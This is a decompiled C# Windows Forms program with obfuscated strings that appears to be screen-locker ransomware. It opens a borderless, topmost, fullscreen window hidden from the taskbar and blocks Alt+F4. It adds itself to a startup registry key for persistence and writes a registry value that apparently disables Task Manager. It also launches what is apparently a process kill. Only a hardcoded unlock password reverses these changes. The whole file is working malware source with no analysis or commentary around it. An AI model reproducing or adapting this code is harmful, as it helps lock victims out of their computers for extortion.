using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ariec;

public class ariapalach : Form
{
	private IContainer icontainer_0;

	private TextBox textBox_0;

	private Button button_0;

	private Label label_0;

	private Label label_1;

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void method_0()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(ariapalach));
		textBox_0 = new TextBox();
		button_0 = new Button();
		label_0 = new Label();
		label_1 = new Label();
		((Control)this).SuspendLayout();
		componentResourceManager.ApplyResources(textBox_0, GClass0.smethod_0("gŬɦ\u0364"));
		((TextBoxBase)textBox_0).set_BorderStyle((BorderStyle)1);
		((Control)textBox_0).set_Name(GClass0.smethod_0("gŬɦ\u0364"));
		componentResourceManager.ApplyResources(button_0, GClass0.smethod_0("LłɅ\u0347ѓ"));
		((Control)button_0).set_BackColor(SystemColors.AppWorkspace);
		((Control)button_0).set_Name(GClass0.smethod_0("LłɅ\u0347ѓ"));
		((ButtonBase)button_0).set_UseVisualStyleBackColor(false);
		((Control)button_0).add_Click((EventHandler)button_0_Click);
		componentResourceManager.ApplyResources(label_0, GClass0.smethod_0("jŤɦ\u0366Ѯ\u0530"));
		((Control)label_0).set_BackColor(Color.Transparent);
		((Control)label_0).set_ForeColor(SystemColors.ControlText);
		((Control)label_0).set_Name(GClass0.smethod_0("jŤɦ\u0366Ѯ\u0530"));
		((Control)label_0).add_Click((EventHandler)label_0_Click);
		componentResourceManager.ApplyResources(label_1, GClass0.smethod_0("jŤɦ\u0366ѮԳ"));
		((Control)label_1).set_BackColor(Color.Transparent);
		((Control)label_1).set_Name(GClass0.smethod_0("jŤɦ\u0366ѮԳ"));
		((Control)label_1).add_Click((EventHandler)label_1_Click);
		((Form)this).set_AcceptButton((IButtonControl)(object)button_0);
		componentResourceManager.ApplyResources(this, GClass0.smethod_0("!Űɫ\u036bѲ"));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).get_Controls().Add((Control)(object)label_1);
		((Control)this).get_Controls().Add((Control)(object)label_0);
		((Control)this).get_Controls().Add((Control)(object)button_0);
		((Control)this).get_Controls().Add((Control)(object)textBox_0);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_KeyPreview(true);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name(GClass0.smethod_0("kŻɡ\u0366Ѷդ٨ݢࡡ३"));
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).add_Load((EventHandler)ariapalach_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public ariapalach()
	{
		if (144454 > Screen.get_PrimaryScreen().get_Bounds().Height + Screen.get_PrimaryScreen().get_Bounds().Width)
		{
			method_0();
			((Form)this).set_KeyPreview(true);
		}
	}

	protected override void OnKeyDown(KeyEventArgs keyEventArgs_0)
	{
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Invalid comparison between Unknown and I4
		if (10654 > Screen.get_PrimaryScreen().get_Bounds().Height + Screen.get_PrimaryScreen().get_Bounds().Width)
		{
			((Control)this).OnKeyDown(keyEventArgs_0);
			if ((int)keyEventArgs_0.get_KeyCode() == 115 && keyEventArgs_0.get_Alt())
			{
				keyEventArgs_0.set_Handled(true);
			}
		}
	}

	public static void sccrapkis()
	{
		if (Control.get_DefaultBackColor().ToString() != GClass0.smethod_0("ašɷ\u0361Ѧդٯ"))
		{
			string text = GClass0.smethod_0("@Žɷ\u0364Ѹկٿݩࡗ\u0947\u0a60୫\u0c75൩\u0e76ཫၥᅶቝ");
			string executablePath = Application.get_ExecutablePath();
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(text + GClass0.smethod_0("@ŌɳͷѼո١ݦࡈॐ੧\u0b63\u0c62൪\u0e60\u0f79ၚᅮቸ፺ᑡᕨᙨ\u1759ᡖ\u1976\u1a6c᭝"));
			try
			{
				registryKey.SetValue(GClass0.smethod_0("tŰɫ\u036cѬձٵ"), executablePath);
				registryKey.Close();
			}
			catch
			{
			}
		}
	}

	public static void salerer()
	{
		string text = GClass0.smethod_0("|Ŧɵ\u036eѯժٮݭ");
		if (Screen.get_PrimaryScreen().get_Bounds().Width > 1)
		{
			Process.Start(GClass0.smethod_0("dūɡ\u032aѦպ٤"), GClass0.smethod_0(",Łȡ") + text + GClass0.smethod_0("4ļɴ\u0331пզ٣ܭࡩॳ\u0a7a\u0b65౧൵\u0e63\u0f77ဪᅦቺ፤"));
		}
	}

	public static void sell()
	{
		Application.Exit();
	}

	public static void egsw()
	{
		string value = GClass0.smethod_0("0");
		string text = GClass0.smethod_0("Eźɲ\u0367ѥհ٢ݪࡒ\u0940\u0a65୨౸൦\u0e7bཨ\u1060ᅱቘፔᑫᕯ");
		string subkey = text + GClass0.smethod_0("Gōɖ\u0353у՝٨ݮࡩॿ\u0a77୬\u0c41൳\u0e67ཧၺᅽቿፌᑟᕡᙡᝥᡨᥣ\u1a6c᭻ᱛᵕṼί⁷Ⅷ≬");
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(subkey);
			registryKey.SetValue(GClass0.smethod_0("JŤɿ\u036aѨե٭ݓࡧॶ੯\u0b4e\u0c65൳"), value);
			registryKey.Close();
		}
		catch (Exception)
		{
			if (34 > Screen.get_PrimaryScreen().get_Bounds().Width)
			{
				sell();
			}
		}
	}

	public static void eef3e()
	{
	}

	private void ariapalach_Load(object sender, EventArgs e)
	{
		Thread.Sleep(60);
		if (Screen.get_PrimaryScreen().get_Bounds().Width > 350)
		{
			((Form)this).set_TopMost(true);
			((Form)this).set_WindowState((FormWindowState)2);
			((Control)this).set_Width(Screen.get_PrimaryScreen().get_Bounds().Width);
			((Control)this).set_Height(Screen.get_PrimaryScreen().get_Bounds().Height);
			if (38 < Screen.get_PrimaryScreen().get_Bounds().Width)
			{
				salerer();
				int num = 0;
				for (num = 0; num < 255; num++)
				{
				}
			}
		}
		sccrapkis();
		Application.DoEvents();
		egsw();
		Application.DoEvents();
	}

	private void button_0_Click(object sender, EventArgs e)
	{
		//IL_015e: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox_0).get_Text() == GClass0.smethod_0("oŭɭ"))
		{
			Process.Start(GClass0.smethod_0("TĬɉ\u0343Ѻռٵݿ\u0878ॽ\u0a51୩\u0c73ൺ\u0e65ཧၵᅣቷጪᑦᕺᙤ"));
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(GClass0.smethod_0("}łɊ\u035fѝՈ\u065a\u0742\u087a२\u0a4d\u0b40\u0c50ൎ๓\u0f70ၸᅩቀፌᑳᕷᙼ\u1778ᡡᥦᩈ᭐ᱧᵣṢὪ\u2060ⅹ≚⍮⑸╺♡❨⡨⥙⩖⭶ⱬⵝ"));
			try
			{
				string text = GClass0.smethod_0("mŪɮ");
				registryKey.DeleteValue(GClass0.smethod_0("qŷ") + text + GClass0.smethod_0("qŵ"));
				registryKey.Close();
			}
			catch
			{
			}
			string text2 = GClass0.smethod_0("`űɳ\u0362Ѱդ");
			int num = 5;
			string subkey = GClass0.smethod_0("QŮ") + text2 + GClass0.smethod_0("mŽɆ\u034dџՃ\u0658\u0745ࡏड़\u0a7bୱ\u0c4c\u0d4a\u0e47ཌྷ\u1056ᅓቃ\u135dᑨᕮᙩ\u177fᡷᥬᩁ\u1b73ᱧᵧṺώⁿ⅌≟⍡②╥♨❣⡬⥻⩛⭕ⱼ\u2d77\u2e77⽧ぬ");
			try
			{
				RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(subkey);
				registryKey2.SetValue(GClass0.smethod_0("JŤɿ\u036aѨե٭ݓࡧॶ੯\u0b4e\u0c65൳"), (num - 5).ToString());
				registryKey2.Close();
			}
			catch (Exception)
			{
			}
			sell();
		}
		else if (10653 > Screen.get_PrimaryScreen().get_Bounds().Height + Screen.get_PrimaryScreen().get_Bounds().Width + 10)
		{
			string text3 = GClass0.smethod_0("аԶ\u0655\u0742<");
			string text4 = GClass0.smethod_0("аԱ");
			MessageBox.Show(GClass0.smethod_0("М") + text3 + GClass0.smethod_0("пԿȥ\u073e=Ķؠ"), GClass0.smethod_0("Т") + text4 + GClass0.smethod_0("аԲȠ"));
		}
	}

	private void label_0_Click(object sender, EventArgs e)
	{
		if (67 > Screen.get_PrimaryScreen().get_Bounds().Height)
		{
			Application.Exit();
		}
	}

	private void label_1_Click(object sender, EventArgs e)
	{
		egsw();
		Application.DoEvents();
	}
}
